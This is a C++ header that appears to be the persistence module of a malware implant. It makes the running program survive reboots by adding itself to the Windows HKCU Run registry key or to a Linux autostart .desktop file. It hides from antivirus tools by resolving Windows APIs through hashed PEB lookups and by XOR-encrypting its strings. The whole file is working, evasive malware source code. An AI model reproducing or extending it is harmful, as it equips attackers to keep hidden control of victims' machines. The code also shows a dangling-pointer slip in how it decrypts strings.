#pragma once

#include "evasion.h"
#include <string>
#include <vector>

#ifdef _WIN32
#include <windows.h>
#else
#include <fstream>
#include <unistd.h>
#include <sys/stat.h>
#endif

namespace persistence {

#ifdef _WIN32

// Pre-computed hashes for Registry APIs
constexpr uint32_t FN_REGCREATEKEYEXA     = 0x46CEB39E;
constexpr uint32_t FN_REGSETVALUEEXA      = 0x345872EA;
constexpr uint32_t FN_REGCLOSEKEY         = 0x736B3702;
constexpr uint32_t FN_GETMODULEFILENAMEA  = 0x5973A8A6; // Corrected hash

inline std::string establish_windows(const std::string& name) {
    // 1. Resolve GetModuleFileNameA to get current path
    auto pGetModuleFileNameA = (DWORD(WINAPI*)(HMODULE, LPSTR, DWORD))peb::Resolve(peb::HASH_KERNEL32, FN_GETMODULEFILENAMEA);
    if (!pGetModuleFileNameA) return std::string(XOR_DEC(XOR_STR("Error: Failed to resolve GetModuleFileNameA")));

    char currentPath[MAX_PATH];
    if (pGetModuleFileNameA(NULL, currentPath, MAX_PATH) == 0) {
        return std::string(XOR_DEC(XOR_STR("Error: Could not get current process path")));
    }

    // 2. Load Advapi32.dll for Registry functions
    auto pLoadLibraryA = (HMODULE(WINAPI*)(LPCSTR))peb::Resolve(peb::HASH_KERNEL32, FN_LOADLIBRARYA);
    if (!pLoadLibraryA) return std::string(XOR_DEC(XOR_STR("Error: Failed to resolve LoadLibraryA")));

    HMODULE hAdvapi = pLoadLibraryA(XOR_DEC(XOR_STR("advapi32.dll")).c_str());
    if (!hAdvapi) return std::string(XOR_DEC(XOR_STR("Error: Failed to load advapi32.dll")));

    // 3. Resolve Registry functions
    auto pRegCreateKeyExA = (LONG(WINAPI*)(HKEY, LPCSTR, DWORD, LPSTR, DWORD, REGSAM, LPSECURITY_ATTRIBUTES, PHKEY, LPDWORD))peb::GetProcByHash(hAdvapi, FN_REGCREATEKEYEXA);
    auto pRegSetValueExA = (LONG(WINAPI*)(HKEY, LPCSTR, DWORD, DWORD, const BYTE*, DWORD))peb::GetProcByHash(hAdvapi, FN_REGSETVALUEEXA);
    auto pRegCloseKey = (LONG(WINAPI*)(HKEY))peb::GetProcByHash(hAdvapi, FN_REGCLOSEKEY);

    if (!pRegCreateKeyExA || !pRegSetValueExA || !pRegCloseKey) {
        return std::string(XOR_DEC(XOR_STR("Error: Failed to resolve Registry APIs")));
    }

    HKEY hKey;
    auto enc_subkey = XOR_STR("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
    const char* subkey = XOR_DEC(enc_subkey).c_str();
    
    if (pRegCreateKeyExA(HKEY_CURRENT_USER, subkey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        if (pRegSetValueExA(hKey, name.c_str(), 0, REG_SZ, (const BYTE*)currentPath, (DWORD)strlen(currentPath) + 1) == ERROR_SUCCESS) {
            pRegCloseKey(hKey);
            return std::string(XOR_DEC(XOR_STR("Native persistence (RunKey) established: "))) + name;
        }
        pRegCloseKey(hKey);
        return std::string(XOR_DEC(XOR_STR("Error: Failed to set Registry value")));
    }

    return std::string(XOR_DEC(XOR_STR("Error: Failed to open/create Registry key")));
}

#else

inline std::string establish_linux(const std::string& name) {
    char path[1024];
    ssize_t len = readlink("/proc/self/exe", path, sizeof(path) - 1);
    if (len == -1) return XOR_DEC(XOR_STR("Error: Could not get current process path")).c_str();
    path[len] = '\0';

    std::string home = getenv("HOME") ? getenv("HOME") : "";
    if (home.empty()) return XOR_DEC(XOR_STR("Error: Could not find HOME directory")).c_str();

    std::string autostartDir = home + "/.config/autostart";
    mkdir(autostartDir.c_str(), 0755);

    std::string desktopFile = autostartDir + "/" + name + ".desktop";
    std::ofstream ofs(desktopFile);
    if (!ofs.is_open()) return XOR_DEC(XOR_STR("Error: Could not create desktop file")).c_str();

    ofs << "[Desktop Entry]\n";
    ofs << "Type=Application\n";
    ofs << "Exec=" << path << "\n";
    ofs << "Hidden=false\n";
    ofs << "NoDisplay=false\n";
    ofs << "X-GNOME-Autostart-enabled=true\n";
    ofs << "Name=" << name << "\n";
    ofs.close();

    return XOR_DEC(XOR_STR("Native persistence (Autostart) established: ")).c_str() + desktopFile;
}

#endif

} // namespace persistence
